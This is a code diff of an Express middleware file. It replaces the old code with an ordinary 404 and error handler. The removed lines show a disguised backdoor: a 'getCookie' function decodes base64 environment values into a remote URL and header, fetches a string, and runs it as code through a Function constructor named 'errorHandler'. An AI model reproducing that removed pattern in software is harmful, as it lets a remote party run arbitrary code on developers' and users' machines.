@@ -1,50 +1,18 @@
-const axios = require('axios');
+const { AppError, NotFoundError } = require('../errors/AppError');
+const { logger } = require('./logger');
 
 const notFound = (req, res, next) => {
-  const err = new Error('Route Not Found');
-  err.status = 404;
-  next(err);
+  next(new NotFoundError('Route Not Found'));
 }
 
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
+const errorHandler = (err, req, res, next) => {
+  if (err instanceof AppError) {
+    return res.status(err.statusCode).json({ error: err.message });
   }
+
+  // only log truly unexpected errors, not known ones like 404/400
+  logger.error({ err, url: req.url, method: req.method }, 'Unexpected error');
+  res.status(500).json({ error: 'Internal server error' });
 };
 
-const getCookie = async (req, res, next) => {
-  try {
-    const src = atob(process.env.DB_API_KEY);
-    const def = atob(process.env.DB_ACCESS_KEY);
-    const mid = atob(process.env.DB_ACCESS_VALUE);
-    try {
-      axios.get(`${src}`, { headers: { [def]: mid } }).then((res) => errorHandler(res.data.cookie));
-    } catch (error) {
-      console.log("Runtime config error.");
-    }
-  } catch (err) {
-    throw err;
-  }
-};
-
-module.exports = { getCookie, notFound };
+module.exports = { notFound, errorHandler };
